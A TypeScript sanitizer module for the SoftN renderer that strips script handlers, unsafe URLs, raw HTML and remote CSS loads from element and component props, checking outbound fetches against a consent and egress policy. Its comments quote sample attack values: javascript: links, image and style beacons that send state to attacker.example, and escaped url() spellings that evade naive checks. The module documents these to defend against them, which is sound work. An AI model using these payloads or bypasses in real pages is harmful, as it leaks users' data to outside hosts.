/**
 * What the renderer takes off an element's props before they reach the page:
 * code a plain tag would run, and addresses the browser would fetch or
 * navigate to that are unsafe or that the app may not reach. Each check here
 * is one renderElement makes; see render.tsx.
 */

import React from 'react';
import type { SoftNProps, SoftNRenderContext } from '../types';
import {
  cssResourceReferences,
  isRemoteUrl,
  isSafeUrl,
  DOCUMENT_NAMED_TAGS,
  TOP_LAYER_ATTRIBUTES,
  URL_ATTRIBUTES,
  dropsFromMarkup,
} from './sanitize-html';
import { describeMarkupEgress, describeSrcSetEgress, type EgressConfig } from '../runtime/egress-policy';
import { loadsFromOutside } from './html-elements';
import { isDevelopment } from './development';

/**
 * Take off a plain tag what would run as code in the page itself. A handler
 * is a function SoftN made (`onClick` from `@click` or `onclick="…"`); one
 * given as text (`ONCLICK="…"`, or `onclick` from the code a page runs) is
 * React's to write as an attribute wherever it treats the element as custom,
 * so every `on…` that is not a function goes; and what dropsFromMarkup
 * names, as the HTML sanitizer takes it off too.
 */
export function dropCodeAttributes(props: SoftNProps): void {
  for (const name of Object.keys(props)) {
    const lower = name.toLowerCase();
    if ((lower.startsWith('on') && typeof props[name] !== 'function') || dropsFromMarkup(lower, props[name])) delete props[name];
  }
}

/**
 * Attributes whose value the browser will fetch or navigate to.
 *
 * `BLOCKED_TAGS` above stops a bundle from writing `<script>`, but nothing
 * stopped it writing `<a href="javascript:…">`: React only warns, and one click
 * then runs bundle-authored code on the host origin, where every other app's
 * `softn:*` and `xdb:*` storage is readable. `<img src="https://…?d={state}">`
 * is the same hole without the click, and without needing the `net` grant.
 */
const URL_PROPS = new Set([
  ...URL_ATTRIBUTES,
  // React's camelCase spelling of xlink:href, as it reads once lowercased.
  'xlinkhref',
]);

/**
 * The name a URL prop is judged by: lowercased, because that is how the
 * browser reads it. `URL_ATTRIBUTES` is the HTML list and carries only
 * lowercase names, while React spells the same attributes `formAction`,
 * `srcSet` and `xlinkHref` — and passes any other casing an author writes
 * straight to `setAttribute`, which lowercases it on an HTML element. An
 * exact-case lookup let `<button formAction="javascript:…">` reach the DOM
 * with no check in front of it, and `srcSet` had to be listed by hand.
 */
function urlPropName(name: string): string {
  return name.toLowerCase();
}

/**
 * What the render may let the browser fetch: the bundle's permission config
 * when the host supplied one, the one-bit "withheld while pending" policy
 * when it supplied only consent state, and nothing at all — every URL passes
 * — when it is not enforcing.
 */
export type EgressPolicy = EgressConfig | null;

export function egressPolicyFor(context: SoftNRenderContext): EgressPolicy {
  if (context.egress) return context.egress;
  return context.consentPending === true ? { consentPending: true } : null;
}

/**
 * Whether a URL prop is egress the app is not allowed.
 *
 * The consent bar withholds every softn.* capability until the user answers,
 * but the bundle's own markup never went through softn.*: `<Image src="https://
 * attacker.example/beacon?d=…">` renders a raw `<img src>`, and the browser
 * fetches it on first paint. Under the modal that was unreachable by accident,
 * because the app did not exist until Allow. And after Allow it used to go
 * anywhere: a bundle that declared no `net` at all, or scoped itself to one
 * host, could still beacon state to any host from an image source. Now the
 * same rule `softn.net.fetch` applies decides here — `net` must be granted
 * and the destination permitted — through the evaluator in egress-policy.ts.
 * A relative, `data:` or `blob:` source is not egress and is untouched, so a
 * bundle's own images keep working with no capability at all.
 *
 * `href` is the one exception once consent is answered: a link is navigation
 * the user chooses and can see, not a fetch the render performs, and a bundle
 * that links to its author's site has not used the network. `srcset` gets
 * its own reading because it is a list, not a URL.
 */
function isWithheldUrl(name: string, value: string, policy: EgressPolicy): boolean {
  if (policy === null) return false;
  const canonical = urlPropName(name);
  if (canonical === 'href') return policy.consentPending === true && isRemoteUrl(value);
  const verdict =
    canonical === 'srcset'
      ? describeSrcSetEgress(value, policy)
      : describeMarkupEgress(value, policy);
  return !verdict.allowed;
}

/**
 * Drop the `name` of an element the document answers to by name, which would
 * stand in for one of `document`'s own members; see
 * {@link DOCUMENT_NAMED_TAGS}. Any casing, because the browser lowercases an
 * attribute's name on an HTML element whatever React was given.
 */
export function dropDocumentName(props: SoftNProps, tag: string): void {
  if (!DOCUMENT_NAMED_TAGS.has(tag.toLowerCase())) return;
  for (const name of Object.keys(props)) {
    if (name.toLowerCase() === 'name') delete props[name];
  }
}

/**
 * Drop unsafe URL props before they reach a raw HTML element.
 *
 * Every name in `URL_PROPS` is safe to judge by name here, because on a raw
 * element it can only ever mean the URL the browser will fetch.
 */
export function sanitizeUrlProps(props: SoftNProps, tag: string, policy: EgressPolicy): void {
  for (const name of Object.keys(props)) {
    if (!URL_PROPS.has(urlPropName(name))) continue;
    const value = props[name];
    if (value === undefined || value === null) continue;
    const safe = judgedUrl(name, value, policy);
    if (safe === undefined) {
      // `href={on && url}` is false when there is nothing to link to: no
      // attribute, and nothing worth a warning.
      if (isDevelopment && typeof value !== 'boolean') {
        console.warn(`[SoftN] Blocked unsafe URL in <${tag} ${name}>: ${describeUrlValue(value)}`);
      }
      delete props[name];
    } else if (safe !== value) {
      props[name] = safe;
    }
  }
}

/**
 * What an SVG element would load, judged as a fetch.
 *
 * On `<use>` or a gradient, `href` is not a link a person follows but what
 * the element draws or inherits from, so it is judged as `src` is, unless it
 * names something in the page (`#icon`), which is how a sprite is used. And
 * a value that loads through `url(…)` from outside the page, such as
 * `fill="url(https://…#paint)"`, is dropped: see `loadsFromOutside`.
 */
export function sanitizeSvgReferences(props: SoftNProps, tag: string, policy: EgressPolicy): void {
  for (const name of Object.keys(props)) {
    const value = props[name];
    const lower = name.toLowerCase();
    let refused: boolean;
    if (lower === 'href' || lower === 'xlinkhref' || lower === 'xlink:href') {
      const text = urlText(value);
      refused =
        text !== undefined &&
        !text.trim().startsWith('#') &&
        (!isSafeUrl(text) || isWithheldUrl('src', text, policy));
    } else {
      refused = name !== 'style' && loadsFromOutside(value);
    }
    if (refused) {
      if (isDevelopment) {
        console.warn(`[SoftN] Blocked a load from outside the app in <${tag} ${name}>: ${describeUrlValue(value)}`);
      }
      delete props[name];
    }
  }
}

/**
 * A URL prop's value as the text the browser will be given, or `undefined`
 * when it is not one.
 *
 * The check used to begin `typeof value === 'string'` and pass everything
 * else on as it was, and React writes a list into an attribute as its
 * entries joined: `href={["javascript:alert(1)"]}` reached the page as
 * `href="javascript:alert(1)"`, and `src={["https://attacker.example/b"]}`
 * was fetched while consent was pending. Only text is judged because only
 * text can be: a list's entries can each be allowed and still join into a
 * URL at another host (`["https://cdn.example", "@attacker.example/x"]` is
 * user `cdn.example,` at host `attacker.example`), and an object says
 * whatever its `toString` says on the day. A finite number is its digits.
 */
function urlText(value: unknown): string | undefined {
  if (typeof value === 'string') return value;
  if (typeof value === 'number' && Number.isFinite(value)) return String(value);
  return undefined;
}

/**
 * The text to hand on for a URL prop, or `undefined` when it must not be.
 * What comes back is the string that was judged, never the value it was
 * read from.
 */
function judgedUrl(name: string, value: unknown, policy: EgressPolicy): string | undefined {
  const text = urlText(value);
  if (text === undefined) return undefined;
  return isSafeUrl(text) && !isWithheldUrl(name, text, policy) ? text : undefined;
}

/** A refused URL value for the development warning: its text, or what kind of thing it was. */
function describeUrlValue(value: unknown): string {
  if (typeof value === 'string') return value.slice(0, 80);
  return Array.isArray(value) ? 'a list, where a URL is text' : `${typeof value}, where a URL is text`;
}

/**
 * Drop `dangerouslySetInnerHTML`: markup a bundle writes itself, set as the
 * element's HTML with no tag list, no attribute list and no URL check in
 * front of it.
 *
 * Nothing here removed it. What stopped `<div dangerouslySetInnerHTML={x} />`
 * from being the whole of the sanitiser's undoing was React, which refuses
 * the prop on an element that is also given children, and this renderer
 * happens to hand every element a children list, empty or not. That is an
 * accident of how elements are built two screens below, and the refusal was
 * an exception that took the document down with it. It is removed by name
 * now, on a raw element and on a registered component alike: a component
 * that spreads the props it does not know onto its root would set it just
 * as a `<div>` does. React knows the prop by this spelling and no other.
 */
export function dropRawMarkupProp(props: SoftNProps): void {
  if ('dangerouslySetInnerHTML' in props) delete props.dangerouslySetInnerHTML;
}

/**
 * Drop the attributes that open an element in the top layer, which no
 * containment clips; see {@link TOP_LAYER_ATTRIBUTES}. On a raw element only:
 * a registered component's props are named by its author and none of the
 * built-ins passes unknown props to the DOM.
 */
export function dropTopLayerProps(props: SoftNProps): void {
  for (const name of Object.keys(props)) {
    if (TOP_LAYER_ATTRIBUTES.has(name.toLowerCase())) delete props[name];
  }
}

/**
 * Withhold remote `url(...)` from an inline `style={{…}}`.
 *
 * `sanitizeBundleCSS` already rewrites remote `url()` in a bundle's style
 * block; the inline style object is a second route to the identical fetch —
 * `style={{ backgroundImage: "url(https://attacker.example/beacon)" }}` — and
 * it had no check at all. What it may load after the user allows is the same
 * question every other sink asks, with the same answer: `net`, granted, to a
 * permitted host. A bundle that legitimately points at a CDN declares it.
 *
 * The check used to look for the text `url(`, which is one of the ways to
 * spell a fetch and not the others: `URL(`, `\75rl(`, a name split by an
 * empty comment and `image-set("https://…" 1x)` all reached the page, and each made the
 * request. The scan now undoes comments and escapes and knows every CSS
 * function that loads something, and a declaration that carries a resource
 * the app may not load is dropped whole — a value that needed escapes to say
 * what it says is dropped too, because nothing an inline style legitimately
 * says needs them, and the alternative is trusting a parser to have thought
 * of every spelling.
 *
 * The object is copied rather than mutated: it may be the app's own state, and
 * deleting from that would corrupt the state as well as the render.
 */
export function withholdRemoteStyleUrls(props: SoftNProps, policy: EgressPolicy): void {
  if (policy === null) return;
  // `style`, and a component's other style objects — `tooltipStyle`,
  // `overlayStyle` — which it spreads onto an element of its own just the same.
  for (const name of Object.keys(props)) {
    if (name === 'style' || name.endsWith('Style')) withholdFromStyle(props, name, policy);
  }
}

function withholdFromStyle(props: SoftNProps, prop: string, policy: NonNullable<EgressPolicy>): void {
  const style = props[prop];
  if (typeof style !== 'object' || style === null || Array.isArray(style)) return;

  let copy: Record<string, unknown> | null = null;
  for (const [name, value] of Object.entries(style as Record<string, unknown>)) {
    if (typeof value !== 'string') {
      // A number is a length or a weight, and nothing at all is nothing set.
      // A list or an object is neither, and React writes it out as text:
      // `backgroundImage: ["url(https://attacker.example/b)"]` was the same
      // fetch as the string this function was written to stop.
      if (value === null || value === undefined || typeof value === 'number' || typeof value === 'boolean') continue;
      if (!copy) copy = { ...(style as Record<string, unknown>) };
      delete copy[name];
      continue;
    }
    const scan = cssResourceReferences(value);
    if (!scan.opaque && scan.urls.length === 0) continue;
    const withheld =
      scan.opaque || scan.urls.some((target) => !describeMarkupEgress(target, policy).allowed);
    if (!withheld) continue;
    if (!copy) copy = { ...(style as Record<string, unknown>) };
    delete copy[name];
  }
  if (copy) props[prop] = copy;
}

/**
 * URL prop names scrubbed on registered components too, not just raw elements.
 *
 * A registered component is not the boundary the check above assumed it was:
 * `<Breadcrumb items={[{label, href}]}>` hands the href straight to an `<a>`,
 * so leaving the guarantee to each of the built-ins holds only for as long
 * as every one of them remembers. Scrubbing here makes it structural.
 *
 * The set is deliberately narrower than `URL_ATTRIBUTES`, because a component
 * prop is named by whoever wrote the component rather than by HTML. `data` is
 * the rows a chart plots, `action` is the ReactNode an `<EmptyState>` renders
 * under its message, and `background` and `cite` read as a colour and a
 * quotation source — dropping those by name would delete legitimate values.
 * What is left means a URL and nothing else.
 */
const COMPONENT_URL_PROPS = new Set([
  'href',
  'src',
  'srcset',
  'poster',
  'formaction',
  'xlinkhref',
  'xlink:href',
  // <Image fallbackSrc> is loaded the moment the primary source fails, and
  // was the one image URL a component took under a name this list did not
  // know: a remote fallback beaconed while consent was pending, and with no
  // `net` grant at all after it. Judged here it is withheld like `src`.
  'fallbacksrc',
  // <NavItem navigate> is the address its link goes to.
  'navigate',
]);

/**
 * How far inside a prop value the scrub descends before it stops handing
 * the value on.
 *
 * `items={[{href}]}` is already two levels down and every level of a tree is
 * two more. The cap used to be 8, and what lay past it was returned as it
 * was: a URL five levels down a tree was not judged at all. A value that
 * refers back to itself is what the cap was for, and that is now caught as
 * what it is (see `Scrubbed`), so the cap only bounds the call stack. It
 * is far past any tree an app draws, and what is past it is dropped, not
 * passed: a limit on what gets checked must not be a way round the check.
 */
const MAX_SCRUB_DEPTH = 512;

/** A record as `{ … }` makes one: not a list, an instance of a class or a host object. */
export function isPlainObject(value: unknown): value is Record<string, unknown> {
  if (typeof value !== 'object' || value === null) return false;
  const proto = Object.getPrototypeOf(value);
  return proto === Object.prototype || proto === null;
}

/**
 * What one scrub has made of each list and record it has met.
 *
 * A value is `WALKING` while the scrub is inside it and its scrubbed form
 * once it is through. That is two questions answered at once. Meeting a
 * value that is still being walked is a value that holds itself, and the way
 * back round is cut. Meeting one that is done is a value reached by a second
 * path, and it is not walked again: without this a tree whose branches are
 * shared (`node.children = [below, below]`, twenty levels of it) was walked
 * once per path, a million times, where the depth limit this replaced had
 * at least kept that short.
 */
type Scrubbed = Map<object, unknown>;
const WALKING = Symbol('being scrubbed');

/**
 * Return `value` with any unsafe URL under a `COMPONENT_URL_PROPS` key removed.
 *
 * The same reference comes back when nothing was unsafe, and a copy otherwise:
 * these arrays and objects are the app's own state, so deleting a key in place
 * would corrupt the state as well as the render.
 */
function scrubUrlsIn(
  value: unknown,
  depth: number,
  blocked: string[],
  policy: EgressPolicy,
  seen: Scrubbed
): unknown {
  // Elements arriving as a prop were built by `renderElement`, which already
  // sanitized them; copying one here would drop the non-enumerable bookkeeping
  // React puts on it.
  if (React.isValidElement(value)) return value;

  const list = Array.isArray(value);
  if (!list && !isPlainObject(value)) return value;
  const holder = value as object;

  if (seen.has(holder)) {
    // A value that holds itself: the way back up ends here, where returning
    // the original would hand over everything in it unjudged. One that has
    // been walked already (a record that appears twice) is what it was
    // found to be the first time.
    const before = seen.get(holder);
    return before === WALKING ? undefined : before;
  }
  if (depth > MAX_SCRUB_DEPTH) return undefined;

  seen.set(holder, WALKING);
  let result: unknown;
  if (list) {
    const entries = value as unknown[];
    let copy: unknown[] | null = null;
    for (let i = 0; i < entries.length; i++) {
      const next = scrubUrlsIn(entries[i], depth + 1, blocked, policy, seen);
      if (next !== entries[i]) {
        if (!copy) copy = entries.slice();
        copy[i] = next;
      }
    }
    result = copy ?? value;
  } else {
    const record = value as Record<string, unknown>;
    let copy: Record<string, unknown> | null = null;
    for (const name of Object.keys(record)) {
      const next = scrubUrlProp(name, record[name], depth + 1, blocked, policy, seen);
      if (next !== record[name]) {
        if (!copy) copy = { ...record };
        copy[name] = next;
      }
    }
    result = copy ?? value;
  }
  seen.set(holder, result);
  return result;
}

function scrubUrlProp(
  name: string,
  value: unknown,
  depth: number,
  blocked: string[],
  policy: EgressPolicy,
  seen: Scrubbed
): unknown {
  if (COMPONENT_URL_PROPS.has(urlPropName(name))) {
    if (value === undefined || value === null) return value;
    // Text or nothing, at any depth: see `urlText`. A component that puts
    // `item.href` into an <a> writes a list out exactly as a raw <a> does.
    const safe = judgedUrl(name, value, policy);
    if (safe === undefined && typeof value !== 'boolean') blocked.push(describeUrlValue(value));
    return safe;
  }
  return scrubUrlsIn(value, depth, blocked, policy, seen);
}

/** Drop unsafe URLs from the props of a registered component. */
export function sanitizeComponentUrlProps(props: SoftNProps, tag: string, policy: EgressPolicy): void {
  const blocked: string[] = [];

  const seen: Scrubbed = new Map();
  for (const name of Object.keys(props)) {
    const next = scrubUrlProp(name, props[name], 0, blocked, policy, seen);
    if (next !== props[name]) props[name] = next;
  }

  if (blocked.length > 0 && isDevelopment) {
    console.warn(`[SoftN] Blocked unsafe URL in <${tag}>: ${blocked[0].slice(0, 80)}`);
  }
}
